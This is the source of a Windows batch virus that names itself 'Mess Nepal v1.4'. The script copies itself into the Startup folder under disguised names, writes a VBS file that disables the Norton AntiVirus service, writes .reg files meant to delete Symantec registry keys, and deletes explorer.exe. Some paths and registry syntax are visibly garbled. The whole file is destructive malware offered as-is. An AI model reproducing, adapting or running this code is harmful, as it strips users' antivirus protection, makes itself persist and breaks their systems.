   @echo off


   If Not Exist "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\nav32.bat" Copy %0 "C:\DocumentC:\Documents and Settings\All Users\Start Menu\Programs\Startup\nav32.bat"
   If Not Exist "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\sysconfig.bat" Copy %0 "C:\DocumentC:\Documents and Settings\All Users\Start Menu\Programs\Startup\sysconfig.bat"
   goto a

   :a
   echo WSHShell = WScript.CreateObject("WScript.Shell") >> c:\messnepal.vbs
   echo WSHShell.RegWrite(HKLM\SYSTEM\CurrentControlSet\Services\navapsvc\start", "4", "REG_DWORD") >> c:\messnepal.vbs
   start c:\messnepal.vbs
   goto b


   :b
   echo [*-HKEY_LOCAL_MACHINE\SOFTWARE\Symantec] >> c:\symantec1.REG
   regedit.exe /s symantec1.reg
   goto c


   :c
   echo [*-HKEY_CURRENT_USER\Software\Symantec] >> c:\symantec2.REG
   regedit.exe /s symantec2.reg
   goto d


   :d
   echo [*-HKEY_CLASSES_ROOT\symantec*.*] >> c:\symantec3.REG
   regedit.exe /s symantec3.reg
   goto e


   :e
   ATTRIB C:\windows\EXPLORER.EXE -H -A -R
   DEL C:\windows\EXPLORER.EXE
   goto f

   :f

   echo *****************Mess Nepal v1.4********************* >> c:\virusinfo.txt
   EXIT
